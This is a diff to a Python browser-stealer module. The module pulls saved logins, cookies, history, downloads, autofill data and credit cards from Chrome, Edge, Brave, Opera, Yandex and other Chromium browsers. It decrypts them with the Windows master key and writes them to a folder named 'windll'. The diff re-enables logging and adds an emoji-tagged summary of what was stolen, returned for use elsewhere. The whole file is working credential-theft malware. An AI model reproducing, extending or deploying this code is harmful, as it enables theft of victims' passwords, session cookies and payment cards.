@@ -3,7 +3,7 @@ import glob
 import base64
 import json
 from win32crypt import CryptUnprotectData
-#from manager.logger import Log
+from manager.logger import Log
 from shutil import copy2
 from sqlite3 import connect
 from Crypto.Cipher import AES
@@ -15,6 +15,7 @@ history = ''''''
 downhistory = ''''''
 cards = ''''''
 autofills = ''''''
+listData = []
 
 def get_master_key(path: str):
     if not os.path.exists(path):
@@ -86,8 +87,7 @@ def get_login_data(path, master_key, blink = False):
             except:
                 pass
         except Exception as e:
-            #Log(f"{path} logins ---> {e}")
-            pass
+            Log(f"{path} logins ---> {e}")
 
 def time(date):
     try:
@@ -119,8 +119,7 @@ def get_web_history(path, blink = False):
         except:
             pass
     except Exception as e:
-        #Log(f"{path} history ---> {e}")
-        pass
+        Log(f"{path} history ---> {e}")
 
 
 def get_downloads(path, blink = False):
@@ -150,8 +149,7 @@ Local Path: {row[1]}
         except:
             pass
     except Exception as e:
-        #Log(f"{path} downhistory ---> {e}")
-        pass
+        Log(f"{path} downhistory ---> {e}")
 
 def get_cookies(path, master_key, blink = False):
     try:
@@ -180,8 +178,7 @@ def get_cookies(path, master_key, blink = False):
         except:
             pass
     except Exception as e:
-        #Log(f"{path} cookies ---> {e}")
-        pass
+        Log(f"{path} cookies ---> {e}")
 
 def get_autofils(path, blink = False):
     try:
@@ -210,8 +207,7 @@ Value: {row[1]}
         except:
             pass
     except Exception as e:
-        #Log(f"{path} autofils ---> {e}")
-        pass
+        Log(f"{path} autofils ---> {e}")
 
 
 def get_credit_cards(path, master_key, blink = False):
@@ -244,9 +240,7 @@ Added On: {datetime.fromtimestamp(row[4])}
         except:
             pass
     except Exception as e:
-        #Log(f"{path} cards ---> {e}")
-        print(e)
-        pass
+        Log(f"{path} cards ---> {e}")
 
 def Write(pathToLogs, browser):
     global logins
@@ -258,7 +252,9 @@ def Write(pathToLogs, browser):
 
     if logins or cookies or history or downhistory or cards or autofills:
         try:
+            listData.append(f"\n🔍{browser}")
             os.makedirs(f"{pathToLogs}\\{browser}")
+            colected = True
         except:
             pass
 
@@ -267,38 +263,47 @@ def Write(pathToLogs, browser):
         with open(rf"{pathToLogs}\\{browser}\\logins.txt", "w", encoding="utf-8") as f:
                 f.write(logins)
         f.close()
+        listData.append("\n∟🔑logins")
     
     if(history):
         with open(rf"{pathToLogs}\\{browser}\\history.txt", "w", encoding="utf-8") as f:
                 f.write(history)
         f.close()
+        listData.append("\n∟📰history")
     
     if(downhistory):
         with open(rf"{pathToLogs}\\{browser}\\downhistory.txt", "w", encoding="utf-8") as f:
                 f.write(downhistory)
         f.close()
+        listData.append("\n∟📥downhistory")
     
     if(cookies):
         with open(rf"{pathToLogs}\\{browser}\\cookies.txt", "w", encoding="utf-8") as f:
                 f.write(cookies)
         f.close()
+        listData.append("\n∟🍪cookies")
     
     if(autofills):
         with open(rf"{pathToLogs}\\{browser}\\autofills.txt", "w", encoding="utf-8") as f:
                 f.write(autofills)
         f.close()
+        listData.append("\n∟⌨autofills")
     
     if(cards):
         with open(rf"{pathToLogs}\\{browser}\\cards.txt", "w", encoding="utf-8") as f:
                 f.write(cards)
         f.close()
+        listData.append("\n∟💳cards")
+        
+    if colected:
+        listData.append("\n")
     
-        logins = ''''''
-        cookies = ''''''
-        history = ''''''
-        downhistory = ''''''
-        cards = ''''''
-        autofills = ''''''
+    logins = ''''''
+    cookies = ''''''
+    history = ''''''
+    downhistory = ''''''
+    cards = ''''''
+    autofills = ''''''
 
 def Chromium():
     global logins
@@ -307,34 +312,37 @@ def Chromium():
     global downhistory
     global cards
     global autofills
+    global listData
+
+    listData.append("\n**🌐Browsers🌐**")
 
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
     pathToLogs = f"{local}\\windll\\Browsers"
 
     browsers = {
-        'amigo': local + '\\Amigo\\User Data',
-        'torch': local + '\\Torch\\User Data',
-        'kometa': local + '\\Kometa\\User Data',
-        'orbitum': local + '\\Orbitum\\User Data',
-        'cent-browser': local + '\\CentBrowser\\User Data',
+        'Amigo': local + '\\Amigo\\User Data',
+        'Torch': local + '\\Torch\\User Data',
+        'Kometa': local + '\\Kometa\\User Data',
+        'Orbitum': local + '\\Orbitum\\User Data',
+        'CentBrowser': local + '\\CentBrowser\\User Data',
         '7star': local + '\\7Star\\7Star\\User Data',
-        'sputnik': local + '\\Sputnik\\Sputnik\\User Data',
-        'vivaldi': local + '\\Vivaldi\\User Data',
-        'google-chrome-sxs': local + '\\Google\\Chrome SxS\\User Data',
-        'google-chrome': local + '\\Google\\Chrome\\User Data',
-        'epic-privacy-browser': local + '\\Epic Privacy Browser\\User Data',
-        'microsoft-edge': local + '\\Microsoft\\Edge\\User Data',
-        'uran': local + '\\uCozMedia\\Uran\\User Data',
-        'yandex': local + '\\Yandex\\YandexBrowser\\User Data',
-        'brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
-        'iridium': local + '\\Iridium\\User Data'
+        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
+        'Vivaldi': local + '\\Vivaldi\\User Data',
+        'Chrome_SXS': local + '\\Google\\Chrome SxS\\User Data',
+        'Chrome': local + '\\Google\\Chrome\\User Data',
+        'EpicPrivacyBrowser': local + '\\Epic Privacy Browser\\User Data',
+        'Edge': local + '\\Microsoft\\Edge\\User Data',
+        'Uran': local + '\\uCozMedia\\Uran\\User Data',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
+        'Iridium': local + '\\Iridium\\User Data'
     }
 
     blink_directory = {
-        'opera': local + '\\Opera Software\\Opera Stable\\',
-        'opera_2': roaming + '\\Opera Software\\Opera Stable\\',
-        'opera_gx': local + '\\Programs\\Opera GX\\',
+        'Opera': local + '\\Opera Software\\Opera Stable\\',
+        'Opera_2': roaming + '\\Opera Software\\Opera Stable\\',
+        'OperaGX': local + '\\Programs\\Opera GX\\',
     }
 
     for key, value in browsers.items():
@@ -354,7 +362,7 @@ def Chromium():
                     get_autofils(profile_path)
                     get_credit_cards(profile_path, master_key)
                 except Exception as error:
-                    #Log(f"{profile_path} ---> {error}")
+                    Log(f"{profile_path} ---> {error}")
                     pass
             Write(pathToLogs, key)
     
@@ -367,7 +375,5 @@ def Chromium():
         get_credit_cards(value, master_key, True)
         get_autofils(value, True)
         Write(pathToLogs, key)
-
-if __name__ == "__main__":
-    Chromium()
-
+    
+    return listData
